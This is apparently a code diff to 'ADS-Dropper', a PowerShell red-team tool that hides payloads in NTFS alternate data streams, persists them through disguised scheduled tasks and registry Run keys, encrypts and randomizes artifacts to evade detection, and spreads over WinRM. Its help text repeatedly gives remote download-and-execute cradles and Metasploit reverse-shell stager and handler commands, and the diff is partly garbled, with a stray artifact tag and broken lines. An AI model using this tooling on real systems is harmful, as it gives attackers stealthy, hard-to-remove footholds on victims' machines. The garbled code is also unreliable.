@@ -1,10 +1,200 @@
 <#
-.SYNOPSIS
-    ADS-Dropper v2.0: C2-Agnostic ADS Persistence (Imix/MSF/Sliver/CCDC)
-.DESCRIPTION
-    Complete implementation with ALL functions fixed.
+<artifact identifier="ads-dropper-help-file" type="application/vnd.ant.code" language="powershell" title="ADS-Dropper Help System"> <# .SYNOPSIS ADS-Dropper v2.1 - C2-Agnostic NTFS Persistence Framework
+.DESCRIPTION ADS-Dropper hides arbitrary payloads in NTFS Alternate Data Streams (ADS), executes them via native Windows binaries (VBScript/PowerShell), and persists through multiple methods (Scheduled Tasks, Registry, WMI, Volume Root ADS).
+Supports any C2 framework (Realm Imix, Metasploit, Sliver) or custom commands.
+Includes AES-256 encryption, randomization, and privilege adaptation.
+.PARAMETER Payload [REQUIRED] The payload to deploy. Accepts: - String: PowerShell command or script - Array: File path to payload script (e.g., @('payload.ps1'))
+Examples:
+  "IEX (New-Object Net.WebClient).DownloadString('http://c2/stager.ps1')"
+  @('C:\payloads\imix_stager.ps1')
+  "Write-Output 'Beacon' | Out-File C:\beacon.log -Append"
+.PARAMETER Targets Target hosts for deployment. Default: @('localhost')
+- 'localhost' = Local deployment
+- Remote IPs/hostnames = Lateral movement via WinRM (requires -Credential)
+
+Examples:
+  -Targets @('localhost')
+  -Targets @('10.10.10.50', 'dc01.corp.local')
+.PARAMETER Persist Persistence methods (comma-separated). Default: @('task')
+Available methods:
+  task     - Scheduled Task (requires admin, logon + periodic triggers)
+  reg      - Registry Run key (works as user or admin)
+  volroot  - Volume Root ADS (requires admin, novel technique)
+
+Examples:
+  -Persist @('task')
+  -Persist @('task', 'reg')
+  -Persist @('volroot')
+.PARAMETER Randomize Enable randomization for evasion: - Random file/stream names (mimics legitimate Windows ADS) - Random loader names (app_log_*.vbs/ps1) - Random task names (GUIDs)
+Breaks signature-based detection but makes cleanup harder.
+
+Example:
+  -Randomize
+.PARAMETER Encrypt Enable AES-256 encryption of payload in ADS.
+- Key derived from machine UUID + hostname (deterministic per-system)
+- Automatically switches to PowerShell loader (VBScript can't decrypt)
+- Payload stored as Base64-encoded ciphertext
+
+Example:
+  -Encrypt
+.PARAMETER NoExec Stage artifacts (ADS, loader, persistence) WITHOUT executing.
+Use for:
+- Pre-staging during recon phase
+- Testing deployment without triggering C2 callbacks
+- Verifying artifacts before execution
+
+Example:
+  -NoExec
+.PARAMETER Credential PSCredential for remote deployment (WinRM authentication).
+Required when -Targets includes remote hosts.
+
+Example:
+  -Credential (Get-Credential)
+.EXAMPLE # Basic local deployment (unencrypted, scheduled task) .\ADS-Dropper.ps1 -Payload "Write-Output 'Test' | Out-File C:\test.log"
+Description:
+Stores payload in C:\ProgramData\SystemCache.dat:syc_payload
+Creates VBScript loader at C:\ProgramData\app_log_a.vbs
+Registers scheduled task: \Microsoft\Windows\Customer Experience Improvement Program\UsbCeip
+Executes immediately
+.EXAMPLE # Encrypted deployment with randomization (RECOMMENDED FOR OPSEC) $payload = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/imix.ps1')" .\ADS-Dropper.ps1 -Payload $payload -Encrypt -Randomize
+Description:
+- AES-256 encrypts payload (key from UUID+hostname)
+- Random file: C:\ProgramData\CacheSvc.log
+- Random stream: :SmartScreen or :Zone.Identifier
+- Random loader: app_log_kqmxyz.ps1 (PowerShell for decryption)
+- Random task: \Microsoft\Windows\UX\a3f5b2c1
+.EXAMPLE # Multi-method persistence (belt-and-suspenders) .\ADS-Dropper.ps1 -Payload $c2Stager -Persist @('task', 'reg') -Encrypt
+Description:
+Creates TWO persistence methods:
+1. Scheduled task (SYSTEM-level, periodic execution)
+2. Registry Run key (user-level, executes on logon)
+Ensures survival even if one method is detected/removed
+.EXAMPLE # Volume root ADS (novel technique, requires admin) .\ADS-Dropper.ps1 -Payload $beacon -Persist @('volroot') -Randomize
+Description:
+- Stores execution command in C:\:ads_1234 (volume root ADS)
+- Creates task: \Microsoft\Windows\Maintenance\WinSAT_567
+- Task executes: powershell -Command "Get-Content 'C:\:ads_1234' | IEX"
+- Survives directory deletions (no parent file)
+.EXAMPLE # Stage without execution (recon phase) .\ADS-Dropper.ps1 -Payload $payload -NoExec -Verbose
+Description:
+Creates all artifacts (ADS, loader, scheduled task) but does NOT execute.
+Use -Verbose to see deployment details.
+Manually trigger later via: wscript.exe //B C:\ProgramData\app_log_a.vbs
+.EXAMPLE # Lateral movement to multiple hosts $cred = Get-Credential # Prompt for domain\user credentials $targets = @('10.10.10.50', '10.10.10.51', 'dc01.corp.local') .\ADS-Dropper.ps1 -Payload $msfStager -Targets $targets -Credential $cred -Encrypt -Randomize
+Description:
+- Deploys to 3 remote hosts via WinRM
+- Serializes functions and executes remotely
+- Each host gets unique random artifacts (if -Randomize)
+.EXAMPLE # Realm C2 (Imix agent) deployment - CCDC scenario $imixStager = Get-Content .\imix_stager.txt -Raw # Base64 from Realm console .\ADS-Dropper.ps1 -Payload $imixStager -Persist @('task', 'reg') -Encrypt -Randomize -Verbose
+Description:
+Full stealth deployment:
+- Encrypted Imix stager
+- Randomized artifacts (evades signatures)
+- Dual persistence (task + registry)
+- Verbose output for verification
+.EXAMPLE # Metasploit reverse shell # First, generate stager with msfvenom: # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f psh-cmd
+$msfPayload = 'IEX (New-Object Net.WebClient).DownloadString("http://192.168.1.100/payload.ps1")'
+.\ADS-Dropper.ps1 -Payload $msfPayload -Persist @('task') -Encrypt
+
+Description:
+Deploys Metasploit stager with encryption.
+Start MSF handler: msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.1.100; set LPORT 443; exploit"
+.EXAMPLE # Sliver implant deployment $sliverStager = @('C:\payloads\sliver_beacon.ps1') # Generated by Sliver .\ADS-Dropper.ps1 -Payload $sliverStager -Persist @('volroot') -Randomize -Encrypt
+Description:
+Deploys Sliver beacon from file with volume root persistence.
+.EXAMPLE # Custom persistent command (non-C2) $customBeacon = @' while($true) { "$(Get-Date) - Beacon alive" | Out-File C:\beacon.log -Append Start-Sleep -Seconds 300 } '@ .\ADS-Dropper.ps1 -Payload $customBeacon -Persist @('reg')
+Description:
+Simple persistent beacon (writes to log every 5 minutes).
+No C2 connection, useful for testing persistence without network traffic.
+.NOTES File Name : ADS-Dropper.ps1 Author : Louis (https://github.com/yourusername) Prerequisite : PowerShell 5.1+, NTFS filesystem, Windows 10+ Version : 2.1
+MITRE ATT&CK Mapping:
+- T1564.004: Hide Artifacts - NTFS File Attributes
+- T1053.005: Scheduled Task/Job
+- T1547.001: Boot or Logon Autostart Execution - Registry Run Keys
+
+Detection:
+- Sysmon Event ID 15 (FileCreateStreamHash) - ADS creation
+- Windows Event ID 4698 (Task Created)
+- Windows Event ID 4657 (Registry modification)
+
+Cleanup:
+Run tests/cleanup.ps1 to remove all artifacts:
+  .\tests\cleanup.ps1 -Targets @('localhost')
+.LINK GitHub: https://github.com/yourusername/ADS-Dropper Blog: https://yourusername.github.io/blog/ads-dropper
+Research Credits:
+- Oddvar Moe: https://oddvar.moe (ADS execution techniques)
+- Enigma0x3: https://enigma0x3.net (ADS persistence patterns)
+- MITRE ATT&CK: https://attack.mitre.org/techniques/T1564/004/
+.OUTPUTS Console output showing deployment progress: - Admin status - Target hosts - Persistence methods - ADS creation confirmation - Loader path - Success/failure status
+For remote deployments, returns hashtable with:
+- Success (bool)
+- Artifacts (hashtable with ADS path, loader path)
+- Error (string, if failed)
+.COMPONENT Requires NTFS filesystem (ADS not supported on FAT32/exFAT) Requires PowerShell remoting (WinRM) for lateral movement
+.ROLE Red Team / Penetration Testing
+AUTHORIZED USE ONLY:
+- Penetration testing with written permission
+- CCDC and similar competitive exercises
+- Security research in isolated labs
+
+Unauthorized use is illegal and unethical.
+.FUNCTIONALITY Persistence, Execution, Defense Evasion
 #>
 
+# Help flag intercept
+if ($args -contains '-h' -or $args -contains '--help' -or $args -contains '-?' -or $args -contains '/?' -or $args -contains 'help') {
+    Show-Help
+    exit 0
+}
+
+# Help display function
+Help display function
+function Show-Help { $helpText = @"
+╔══════════════════════════════════════════════════════════════════════════╗ ║ ADS-Dropper v2.1 - Quick Reference ║ ╚══════════════════════════════════════════════════════════════════════════╝
+USAGE: .\ADS-Dropper.ps1 -Payload <string|file> [OPTIONS]
+REQUIRED: -Payload <string|array> Payload to deploy (command or @('file.ps1'))
+OPTIONAL: -Targets <array> Target hosts (default: @('localhost')) -Persist <array> Persistence methods: task, reg, volroot -Randomize Randomize artifacts for evasion -Encrypt AES-256 encrypt payload -NoExec Stage without executing -Credential <PSCredential> Creds for remote deployment
+QUICK START EXAMPLES:
+Local deployment (basic)
+.\ADS-Dropper.ps1 -Payload "Write-Output 'Test'"
+Full stealth (RECOMMENDED)
+.\ADS-Dropper.ps1 -Payload `$c2Stager -Encrypt -Randomize
+Multiple persistence methods
+.\ADS-Dropper.ps1 -Payload `$payload -Persist @('task','reg')
+Lateral movement
+$cred = Get-Credential .\ADS-Dropper.ps1 -Payload payload−Targets@(′dc01′)−Credential‘payload -Targets @('dc01') -Credential ` payload−Targets@(′dc01′)−Credential‘cred
+PERSISTENCE METHODS:
+task Scheduled Task (admin required) └─ Triggers: Logon + periodic (every 5 min) └─ Path: \Microsoft\Windows\UX* or ...\UsbCeip
+reg Registry Run Key (user or admin) └─ HKCU/HKLM:...\CurrentVersion\Run └─ Fallback if not admin
+volroot Volume Root ADS (admin required, NOVEL) └─ Stores command in C::ads_* └─ No parent file, survives directory wipes
+ENCRYPTION:
+-Encrypt enables AES-256 with machine-specific key (UUID+hostname)
+Pros: Prevents static analysis, evades content-based detection Cons: Requires PowerShell loader (more telemetry than VBScript)
+RANDOMIZATION:
+-Randomize generates unique artifacts per deployment:
+File: SystemCache.dat → CacheSvc.log Stream: :syc_payload → :SmartScreen or :Zone.Identifier Loader: app_log_a.vbs → app_log_kqmxyz.vbs Task: UsbCeip → a3f5b2c1-... (GUID)
+C2 FRAMEWORK EXAMPLES:
+Realm C2 (Imix agent)
+$imix = Get-Content .\imix_stager.txt -Raw .\ADS-Dropper.ps1 -Payload $imix -Encrypt -Randomize
+Metasploit
+$msf = 'IEX (New-Object Net.WebClient).DownloadString("http://c2/m.ps1")' .\ADS-Dropper.ps1 -Payload $msf -Persist @('task')
+Sliver
+$sliver = @('C:\payloads\sliver.ps1') .\ADS-Dropper.ps1 -Payload $sliver -Encrypt
+DETECTION & CLEANUP:
+Blue team detection: - Sysmon Event ID 15 (ADS creation) - Event ID 4698 (Task creation) - PowerShell: Get-ChildItem C:\ProgramData -Stream *
+Cleanup artifacts: .\tests\cleanup.ps1 -Targets @('localhost')
+TESTING:
+Validation suite: .\tests\validate.ps1
+Manual verification: dir /r C:\ProgramData # Show ADS schtasks /query /fo LIST # Show tasks Get-Item C::ads_* 2>$null # Check volume root
+MORE INFO:
+Full help: Get-Help .\ADS-Dropper.ps1 -Full Examples: Get-Help .\ADS-Dropper.ps1 -Examples Parameters: Get-Help .\ADS-Dropper.ps1 -Parameter *
+GitHub: https://github.com/yourusername/ADS-Dropper Blog writeup: https://yourusername.github.io/blog/ads-dropper
+ETHICAL USE ONLY - AUTHORIZED TESTING WITH PERMISSION REQUIRED
+"@
+Write-Host $helpText -ForegroundColor Cyan
+}
+
+# Main Code
 [CmdletBinding()] param(
     [Parameter(Mandatory)][object]$Payload,
     [string[]]$Targets = @('localhost'),
